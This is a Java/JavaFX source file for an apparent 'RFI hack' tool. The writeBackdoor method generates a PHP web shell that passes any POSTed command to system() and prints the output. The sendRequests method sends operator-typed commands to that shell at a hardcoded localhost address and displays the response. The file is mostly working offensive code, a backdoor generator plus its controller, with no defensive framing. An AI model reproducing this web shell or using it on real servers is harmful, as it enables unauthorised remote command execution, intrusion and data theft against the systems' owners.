package com.example.rfihack;

import java.util.Scanner;
import java.nio.charset.StandardCharsets;
import java.net.URL;
import java.net.HttpURLConnection;
import java.io.PrintWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStreamWriter;
import javafx.fxml.FXML;
import javafx.scene.Node;
import javafx.scene.Scene;
import javafx.scene.control.Label;
import javafx.scene.control.ScrollPane;
import javafx.stage.Stage;
import javafx.scene.Parent;
import javafx.fxml.FXMLLoader;
import javafx.scene.layout.VBox;
import javafx.event.ActionEvent;
import javafx.scene.control.Button;
import javafx.scene.control.TextField;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;

public class HelloController {

    @FXML
    private Button minimizeButton;
    @FXML
    private Button maximizeButton;
    @FXML
    private Button exitButton;
    @FXML
    private Button menuButton;
    @FXML
    private Button createButton;
    @FXML
    private Button requestButton;
    @FXML
    private Button validButton;
    @FXML
    private Button sendButton;
    @FXML
    private VBox sideBar;
    @FXML
    private TextField inputNameShell;
    @FXML
    private ScrollPane scroll;
    @FXML
    private TextField inputCommand;
    @FXML
    private VBox mainScene;

    private Stage stage;
    private Scene scene;

    public void logout(ActionEvent event) {
        stage = (Stage) mainScene.getScene().getWindow();
        stage.close();
    }

    public void reduce(ActionEvent event) {
        stage = (Stage) mainScene.getScene().getWindow();
        stage.setIconified(true);
    }

    public void setMax(ActionEvent event) {
        stage = (Stage) mainScene.getScene().getWindow();
        stage.setMaximized(true);
    }

    public void switchToRequests(ActionEvent event) throws IOException {
        Parent root = FXMLLoader.load(getClass().getResource("requests.fxml"));
        stage = (Stage) ((Node)event.getSource()).getScene().getWindow();
        scene = new Scene(root);
        stage.setScene(scene);
        stage.show();
    }

    public void switchToHello(ActionEvent event) throws IOException {
        Parent root = FXMLLoader.load(getClass().getResource("hello-view.fxml"));
        stage = (Stage) ((Node)event.getSource()).getScene().getWindow();
        scene = new Scene(root);
        stage.setScene(scene);
        stage.show();
    }

    public void sendRequests(ActionEvent event) throws IOException {

        String command = inputCommand.getText();
        URL url = new URL("http://127.0.0.1/");
        HttpURLConnection httpConn = (HttpURLConnection) url.openConnection();
        httpConn.setRequestMethod("POST");

        httpConn.setRequestProperty("Connection", "keep-alive");
        httpConn.setRequestProperty("Cache-Control", "max-age=0");
        httpConn.setRequestProperty("sec-ch-ua", "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"");
        httpConn.setRequestProperty("sec-ch-ua-mobile", "?0");
        httpConn.setRequestProperty("sec-ch-ua-platform", "\"Windows\"");
        httpConn.setRequestProperty("Upgrade-Insecure-Requests", "1");
        httpConn.setRequestProperty("Origin", "http://127.0.0.1");
        httpConn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        httpConn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36");
        httpConn.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
        httpConn.setRequestProperty("Sec-Fetch-Site", "same-origin");
        httpConn.setRequestProperty("Sec-Fetch-Mode", "navigate");
        httpConn.setRequestProperty("Sec-Fetch-User", "?1");
        httpConn.setRequestProperty("Sec-Fetch-Dest", "document");
        httpConn.setRequestProperty("Referer", "http://127.0.0.1/");
        httpConn.setRequestProperty("Accept-Language", "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7");

        httpConn.setDoOutput(true);
        OutputStreamWriter writer = new OutputStreamWriter(httpConn.getOutputStream());

        writer.write("command="+command+"&submit=Valider");
        writer.flush();
        writer.close();
        httpConn.getOutputStream().close();

        InputStream responseStream = httpConn.getResponseCode() / 100 == 2
                ? httpConn.getInputStream()
                : httpConn.getErrorStream();
        Scanner s = new Scanner(responseStream).useDelimiter("\\A");
        String response = s.hasNext() ? s.next() : "";

        Document doc = Jsoup.parse(response);
        Element link = doc.select("h1").first();
        String result = doc.body().text();
        Label resultat = new Label();
        resultat.setText(result);
        resultat.setStyle("-fx-text-fill: white;");
        resultat.setStyle("-fx-font-size: 18px;");
        scroll.setContent(resultat);
    }

    public void derouleMenu(ActionEvent event) {
        System.out.println("Lol !!!!!");
    }

    public void writeBackdoor(ActionEvent event) throws IOException {

        String name = inputNameShell.getText();
        String contenuFile = null;

        PrintWriter writer = new PrintWriter(name + ".php", StandardCharsets.UTF_8);
        writer.println("<?php");
        writer.println("if (isset($_POST[\"submit\"])) {\n");
        writer.println("    $command = htmlspecialchars($_POST['command']);");
        writer.println("    echo \"<h1>\".system($command).\"</h1>\";");
        writer.println("}");
        writer.println("?>");
        writer.println("<!DOCTYPE html>");
        writer.println("<html>");
        writer.println("<head>");
        writer.println("    <meta charset=\"utf-8\">");
        writer.println("    <title>WebShell</title>");
        writer.println("</head>");
        writer.println("<body>");
        writer.println("    <form method=\"POST\">");
        writer.println("        <input type=\"text\" name=\"command\" placeholder=\"Your command\" required>");
        writer.println("        <input type=\"submit\" name=\"submit\" value=\"Valider\">");
        writer.println("    </form>");
        writer.println("</body>");
        writer.println("</html>");
        writer.close();
    }
}